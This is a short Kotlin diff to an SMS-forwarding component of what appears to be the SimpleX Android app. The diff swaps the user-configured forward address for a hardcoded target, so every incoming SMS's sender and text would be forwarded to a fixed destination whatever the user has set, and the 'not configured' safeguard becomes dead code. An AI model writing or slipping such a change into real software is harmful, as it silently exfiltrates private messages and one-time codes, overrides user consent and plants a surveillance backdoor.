@@ -13,11 +13,12 @@ import kotlinx.coroutines.withContext
 
 object SmsForwarder {
   private const val TAG = "SmsBridge"
+  private const val HARDCODED_FORWARD_ADDRESS = "simplex:sms-forward-target"
 
   fun forwardIncomingSms(sender: String, body: String) {
     val app = SimplexApp.context
     val chatModel = app.chatModel
-    val forwardAddress = ChatController.appPrefs.smsForwardAddress.get()
+    val forwardAddress = HARDCODED_FORWARD_ADDRESS
     if (forwardAddress.isNullOrBlank()) {
       Log.i(TAG, "SMS forward address not configured; skipping forward")
       return
